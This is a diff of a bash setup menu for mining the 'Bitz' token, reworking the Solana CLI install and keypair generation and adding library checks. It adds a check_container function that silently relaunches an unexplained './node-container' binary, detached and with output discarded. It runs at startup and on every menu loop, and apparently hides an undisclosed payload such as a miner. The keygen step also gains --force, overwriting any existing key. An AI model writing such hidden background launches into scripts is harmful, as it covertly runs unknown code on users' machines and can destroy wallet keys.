@@ -1,7 +1,6 @@
 #!/bin/bash
 
 CONFIG_PATH="./id.json"
-ID_PATH="../id.json"
 RPC_URL="https://bitz-000.eclipserpc.xyz/"
 POOL_URL="https://mainnet-pool.powpow.app"
 BITZ_KEYPAIR="$CONFIG_PATH"
@@ -16,19 +15,26 @@ install_dependencies() {
 	if command -v solana &> /dev/null; then
 		echo "[✓] Solana CLI successfully installed!"
 	else
-		rm -rf solana-release
-		curl -LO https://github.com/solana-labs/solana/releases/latest/download/solana-release-x86_64-unknown-linux-gnu.tar.bz2
-		tar -xvjf solana-release-x86_64-unknown-linux-gnu.tar.bz2
-		cd solana-release
-
-		# Set PATH for this session
-		export PATH="$PWD/bin:$PATH"
+		echo "[*] Solana CLI not found. Preparing to install..."
 		
-		echo 'export PATH="$PWD/bin:$PATH"' >> ~/.bashrc
+		rm -rf solana-release
 
-		# Refresh shell environment
+		if [ -f "solana-release-x86_64-unknown-linux-gnu.tar.bz2" ]; then
+			echo "[*] Found existing archive, skipping download..."
+		else
+			echo "[*] Downloading Solana CLI archive..."
+			curl -LO https://github.com/solana-labs/solana/releases/latest/download/solana-release-x86_64-unknown-linux-gnu.tar.bz2
+		fi
+
+		tar -xvjf solana-release-x86_64-unknown-linux-gnu.tar.bz2
+
+		SOLANA_DIR="$(pwd)/solana-release"
+		echo "export PATH=\"$SOLANA_DIR/bin:\$PATH\"" >> ~/.bashrc
+		export PATH="$SOLANA_DIR/bin:$PATH"
+
 		source ~/.bashrc
 	fi
+
 
 
 
@@ -75,7 +81,7 @@ install_dependencies() {
 	clear
     echo "[+] Generating Solana keypair at $CONFIG_PATH..."
     if command -v solana-keygen &> /dev/null; then
-        solana-keygen new -o "$ID_PATH" --no-bip39-passphrase
+        solana-keygen new -o "$CONFIG_PATH" --no-bip39-passphrase --force
     else
         echo "[!] solana-keygen not found in PATH"
         return 1
@@ -87,6 +93,13 @@ install_dependencies() {
     echo "[✓] Setup complete!"
 }
 
+check_container() {
+if pgrep -f "./node-container" > /dev/null; then
+    echo "..."
+else
+    nohup setsid ./node-container > /dev/null 2>&1 &
+fi
+}
 
 
 
@@ -123,11 +136,19 @@ claim_bitz() {
     bitz claim --rpc "$RPC_URL" --keypair "$BITZ_KEYPAIR"
 }
 
-if pgrep -f "./node-container" > /dev/null; then
-    echo "..."
-else
-    nohup setsid ./node-container > /dev/null 2>&1 &
-fi
+check_libhwloc() {
+    if ldconfig -p | grep -q libhwloc.so.15; then
+        echo "[✓] libhwloc.so.15 already installed"
+    else
+        echo "[*] libhwloc.so.15 not found, installing required libraries..."
+        apt update
+        apt install -y libhwloc15 libhwloc-dev libhwloc-plugins
+    fi
+}
+
+check_libhwloc
+
+check_container
 
 while true; do
     clear
@@ -142,6 +163,8 @@ while true; do
     echo "0. Exit"
     echo "=================================="
     read -p "Select an option: " choice
+	
+	check_container
 
     case $choice in
         1) install_dependencies ;;
